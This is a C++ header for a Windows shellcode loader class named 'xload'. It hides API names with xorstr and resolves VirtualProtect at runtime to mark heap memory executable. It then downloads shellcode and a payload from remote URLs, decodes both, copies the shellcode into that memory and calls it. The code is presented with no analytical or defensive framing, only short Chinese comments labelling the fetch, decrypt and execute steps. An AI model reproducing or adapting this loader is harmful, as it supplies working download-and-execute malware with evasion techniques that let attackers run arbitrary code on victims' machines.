#pragma once
#include <vector>
#include <crtdbg.h>
#include <corecrt_memory.h>
#include "xweb.hpp"
#include "xcrypt.hpp"
#include "xorstr.hpp"
#include "xvary.hpp"


class xload
{
public:
	xload() {};
	~xload() {};

	static xload* instance()
	{
		if (!_ins)
			_ins = new xload();
		return _ins;
	}

	void* alloc(unsigned long size)
	{
		void* ret = nullptr;

		do
		{
			void* address = malloc(size);
			if (!address)
			{
				break;
			}

			ZeroMemory(address, size);

			HMODULE kernel = GetModuleHandleA(xorstr_("kernel32.dll"));
			if (!kernel)
			{
				break;
			}

			using function = BOOL(WINAPI*)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect);
			function pfn = reinterpret_cast<function>(GetProcAddress(kernel, xorstr_("VirtualProtect")));
			if (!pfn)
			{
				break;
			}

			unsigned long old;
			BOOL err = pfn(address, size, PAGE_EXECUTE_READWRITE, &old);
			if (!err)
			{
				break;
			}

			ret = address;
		} while (false);

		return ret;
	}

	bool load()
	{
		bool ret = false;

		do
		{
			// 拿到 远程数据
			std::string shellcode = xweb::get(SHELLCODE_URL);
			std::string payload = xweb::get(PAYLOAD_URL);
			if (shellcode.empty() || payload.empty())
			{
				break;
			}

			// 解密
			shellcode = xvary::decode(shellcode);
			payload = xvary::decode(payload);
			if (shellcode.empty() || payload.empty())
			{
				break;
			}

			// sc exec memory
			void* address = alloc(shellcode.size());
			if (!address)
			{
				break;
			}
			memcpy_s(address, shellcode.size(), shellcode.c_str(), shellcode.size());

			// 执行
			using function = BOOL(WINAPI*)(const char* buffer, size_t size);
			reinterpret_cast<function>(address)(payload.c_str(), payload.size());

			ret = true;
		} while (false);

		return ret;
	}

	bool fuck()
	{
		return true;
	}

private:
	static xload* _ins;
};

xload* xload::_ins = nullptr;